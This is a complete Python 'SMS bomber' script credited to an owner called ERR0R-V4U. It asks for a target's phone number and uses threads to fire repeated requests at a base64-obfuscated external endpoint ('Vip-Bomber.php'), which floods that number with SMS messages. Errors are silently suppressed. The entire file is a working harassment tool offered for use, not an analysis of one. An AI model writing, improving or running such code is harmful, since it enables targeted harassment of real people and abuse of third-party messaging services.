#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests
import threading
import base64
from concurrent.futures import ThreadPoolExecutor

BANNER = r"""
 
     (   (         (              )    *             (     
     )\ ))\ )    ) )\ )     (  ( /(  (  `     (      )\ )  
 (  (()/(()/( ( /((()/(   ( )\ )\()) )\))(  ( )\ (  (()/(  
 )\  /(_))(_)))\())/(_))  )((_|(_)\ ((_)()\ )((_))\  /(_)) 
((_)(_))(_)) ((_)\(_))   ((_)_  ((_)(_()((_|(_)_((_)(_))   
| __| _ \ _ \/  (_) _ \   | _ )/ _ \|  \/  || _ ) __| _ \  
| _||   /   / () ||   /   | _ \ (_) | |\/| || _ \ _||   /  
|___|_|_\_|_\\__/ |_|_\   |___/\___/|_|  |_||___/___|_|_\  

"""

OWNER_INFO = """
==============================
        Tools Owner Info
==============================
[👤] Owner: ERR0R-V4U
[📘] Facebook Page : https://www.facebook.com/profile.php?id=61564222827738
[📢] Telegram Channel: https://t.me/ERR0R_V4U_Your_Love
"""

RESET_SCREEN = "cls" if os.name == "nt" else "clear"

def clr():
    os.system(RESET_SCREEN)

def banner():
    clr()
    print(BANNER)
    print(OWNER_INFO)
    print("\n")

def format_phone(num):
    return ''.join(filter(str.isdigit, num.strip()))

def input_phone():
    while True:
        cc = input("Enter country code (without +): ").strip()
        cc = format_phone(cc)
        if len(cc) < 1 or not cc.isdigit():
            print("[!] Invalid country code, try again.")
            continue

        target = input(f"Enter target phone number (without country code): ").strip()
        target = format_phone(target)
        if len(target) < 6 or len(target) > 15:
            print("[!] Invalid target phone number length, try again.")
            continue

        return cc, target

def start_bombing(cc, target):
    # Base64 encoded API URL
    encoded_api = "aHR0cHM6Ly9hbG5heWVlbS50b3AvVmlwLUJvbWJlci5waHA/cGhvbmU9"
    base_url = base64.b64decode(encoded_api).decode()
    url = f"{base_url}{cc}{target}"

    total_sms = 10
    delay = 0.5
    threads = 5

    banner()
    print(f"Starting bombing +{cc} {target}")
    print(f"Sending {total_sms} SMS with {threads} threads and {delay} sec delay...\n")
    print("Press CTRL+C to stop.\n")

    def send_request():
        try:
            requests.get(url, timeout=10)
        except Exception:
            pass  # silently ignore errors

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(total_sms):
            futures.append(executor.submit(send_request))
            time.sleep(delay)

        for future in futures:
            future.result()

    time.sleep(5)
    print("\n[+] SMS bombing done successfully!")

def main():
    banner()
    cc, target = input_phone()
    try:
        start_bombing(cc, target)
    except KeyboardInterrupt:
        print("\n[!] Bombing stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
